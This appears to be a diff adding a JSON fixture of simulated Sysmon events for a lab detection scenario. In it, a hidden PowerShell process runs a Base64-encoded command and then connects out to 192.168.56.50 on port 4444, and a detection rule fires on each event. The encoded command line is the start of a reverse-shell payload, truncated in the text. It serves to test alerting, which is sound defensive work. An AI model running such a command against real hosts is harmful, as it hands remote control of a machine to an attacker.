@@ -1,0 +1,49 @@
+{
+  "scenario": "Obfuscated PowerShell Execution & Reverse Shell (INC-20261010-002)",
+  "host": "WIN-LAB-EP01",
+  "ip": "192.168.56.101",
+  "user": "WIN-LAB-EP01\\jdoe",
+  "events": [
+    {
+      "timestamp": "2026-10-10T11:08:35.400Z",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "event_data": {
+        "ProcessId": "6104",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADUAMAAiACwANAA0ADQANAApADsA...",
+        "ParentProcessId": "4912",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "User": "WIN-LAB-EP01\\jdoe",
+        "Hashes": "SHA256=DE96A68E2226DEAC338300257D2787883015A4E973B23100F8FAD02F880D50F6"
+      },
+      "rule_fired": {
+        "id": "100302",
+        "level": 9,
+        "description": "LogForge: PowerShell executed with Base64 encoded command arguments (-EncodedCommand)",
+        "mitre_id": "T1059.001, T1027"
+      }
+    },
+    {
+      "timestamp": "2026-10-10T11:08:42.120Z",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 3,
+      "event_data": {
+        "ProcessId": "6104",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "User": "WIN-LAB-EP01\\jdoe",
+        "Protocol": "tcp",
+        "SourceIp": "192.168.56.101",
+        "SourcePort": "49721",
+        "DestinationIp": "192.168.56.50",
+        "DestinationPort": "4444"
+      },
+      "rule_fired": {
+        "id": "100305",
+        "level": 10,
+        "description": "LogForge HIGH: Suspicious LOLBIN (powershell.exe) established outbound connection on non-standard port 4444",
+        "mitre_id": "T1071.001, T1059.001"
+      }
+    }
+  ]
+}
